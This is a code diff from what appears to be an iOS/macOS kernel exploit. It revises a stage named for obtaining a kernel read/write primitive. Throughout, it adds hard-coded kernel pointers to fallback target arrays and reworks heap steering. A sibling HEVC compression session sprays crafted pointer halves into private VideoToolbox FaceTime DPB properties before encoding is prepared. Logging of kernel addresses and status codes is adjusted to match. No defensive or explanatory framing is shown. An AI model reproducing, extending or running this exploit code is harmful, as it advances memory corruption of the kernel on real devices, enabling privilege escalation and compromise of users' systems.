@@ -2813,9 +2813,9 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                 }
             }
         }
-        const int fallbackNTLs[2] = { 16445, 15989 };
-        const uint64_t fallbackKPtrs[2] = { 0xffffffee4e806580ULL, 0xfffffe2673806580ULL };
-        for (int fi = 0; fi < 2 && nTargets < 6; fi++) {
+        const int fallbackNTLs[3] = { 16433, 16445, 15989 };
+        const uint64_t fallbackKPtrs[3] = { 0xffffffe289ee5658ULL, 0xffffffee4e806580ULL, 0xfffffe2673806580ULL };
+        for (int fi = 0; fi < 3 && nTargets < 6; fi++) {
             BOOL dup = NO;
             for (int j = 0; j < nTargets; j++) {
                 if (targetNTLs[j] == fallbackNTLs[fi]) { dup = YES; break; }
@@ -2873,7 +2873,8 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
                           meKr, rmKr, curP, maxP, aliasVal);
         }
 
-        // Run dynamic NTL heap-band steering sessions with PropertyMode=1 + NumOfTemporalLayer + shaped sibling context
+        // Run dynamic NTL heap-band steering sessions with raw EncoderUsage=1 + RealTime=NO (so prep=0)
+        // paired with a sibling DPB-shaping session (so EnableUserRefForFacetime does not trigger -17691 on `s`).
         for (int ti = 0; ti < nTargets; ti++) {
             int sntl = targetNTLs[ti];
             uint64_t origKPtr = targetKPtrs[ti];
@@ -2884,44 +2885,42 @@ static void RunStage8_KRWPrimitiveAndReadWriteBridge(NSMutableString *log) {
             VTCompressionSessionRef s = NULL;
             if (VTCompressionSessionCreate(kCFAllocatorDefault, 1280, 720, kCMVideoCodecType_HEVC,
                                            NULL, NULL, NULL, NULL, NULL, &s) == noErr && s) {
-                VTSessionSetProperty(s, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
-                VTSessionSetProperty(s, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
                 OSStatus uSt = VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
                 VTSessionSetProperty(s, kVTCompressionPropertyKey_RealTime, kCFBooleanFalse);
-                OSStatus privSt = VTSessionSetProperty(s, CFSTR("NumOfTemporalLayer"), (__bridge CFNumberRef)@(sntl));
-                OSStatus pubSt  = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(sntl));
+                OSStatus pubSt = VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(sntl));
 
-                // Shape DPB (34 ints) with steeredX0 [lo32, hi32] before PrepareToEncodeFrames
-                NSMutableArray *dpbShape = [NSMutableArray arrayWithCapacity:34];
-                for (int p = 0; p < 17; p++) {
-                    [dpbShape addObject:@((int32_t)lo32)];
-                    [dpbShape addObject:@((int32_t)hi32)];
+                // Shape DPB (34 ints) with steeredX0 [lo32, hi32] on a paired sibling session
+                OSStatus dpbSt = -1;
+                VTCompressionSessionRef dpbSib = NULL;
+                if (VTCompressionSessionCreate(kCFAllocatorDefault, 192, 144, kCMVideoCodecType_HEVC,
+                                               NULL, NULL, NULL, NULL, NULL, &dpbSib) == noErr && dpbSib) {
+                    VTSessionSetProperty(dpbSib, CFSTR("PropertyMode"), (__bridge CFNumberRef)@1);
+                    VTSessionSetProperty(dpbSib, CFSTR("EnableUserRefForFacetime"), kCFBooleanTrue);
+                    NSMutableArray *dpbShape = [NSMutableArray arrayWithCapacity:34];
+                    for (int p = 0; p < 17; p++) {
+                        [dpbShape addObject:@((int32_t)lo32)];
+                        [dpbShape addObject:@((int32_t)hi32)];
+                    }
+                    dpbSt = VTSessionSetProperty(dpbSib, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpbShape);
+                    VTCompressionSessionPrepareToEncodeFrames(dpbSib);
                 }
-                OSStatus dpbSt = VTSessionSetProperty(s, CFSTR("UserDPBFramesForFaceTime"), (__bridge CFTypeRef)dpbShape);
 
-                int prePub = -1, prePriv = -1, postPub = -1, postPriv = -1;
+                int prePub = -1, postPub = -1;
                 CFNumberRef rb = NULL;
                 if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                     CFNumberGetValue(rb, kCFNumberIntType, &prePub); CFRelease(rb);
-                }
-                rb = NULL;
-                if (VTSessionCopyProperty(s, CFSTR("NumOfTemporalLayer"), NULL, &rb) == noErr && rb) {
-                    CFNumberGetValue(rb, kCFNumberIntType, &prePriv); CFRelease(rb);
                 }
                 OSStatus prepSt = VTCompressionSessionPrepareToEncodeFrames(s);
                 rb = NULL;
                 if (VTSessionCopyProperty(s, CFSTR("NumberOfTemporalLayers"), NULL, &rb) == noErr && rb) {
                     CFNumberGetValue(rb, kCFNumberIntType, &postPub); CFRelease(rb);
                 }
-                rb = NULL;
-                if (VTSessionCopyProperty(s, CFSTR("NumOfTemporalLayer"), NULL, &rb) == noErr && rb) {
-                    CFNumberGetValue(rb, kCFNumberIntType, &postPriv); CFRelease(rb);
-                }
                 KPH9SafeTeardown(s);
+                if (dpbSib) KPH9SafeTeardown(dpbSib);
 
-                KPH9OutAppend(log, @"  dynSteer[kptr=0x%016llx -> NTL=%d x0=0x%016llx]: usage=%d privSet=%d pubSet=%d dpb34=%d PRE=%d/%d prep=%d POST=%d/%d\n",
-                              origKPtr, sntl, steeredX0, (int)uSt, (int)privSt, (int)pubSt, (int)dpbSt,
-                              prePub, prePriv, (int)prepSt, postPub, postPriv);
+                KPH9OutAppend(log, @"  dynSteer[kptr=0x%016llx -> NTL=%d x0=0x%016llx]: usage=%d pubSet=%d dpb34=%d PRE=%d prep=%d POST=%d\n",
+                              origKPtr, sntl, steeredX0, (int)uSt, (int)pubSt, (int)dpbSt,
+                              prePub, (int)prepSt, postPub);
             }
         }
 
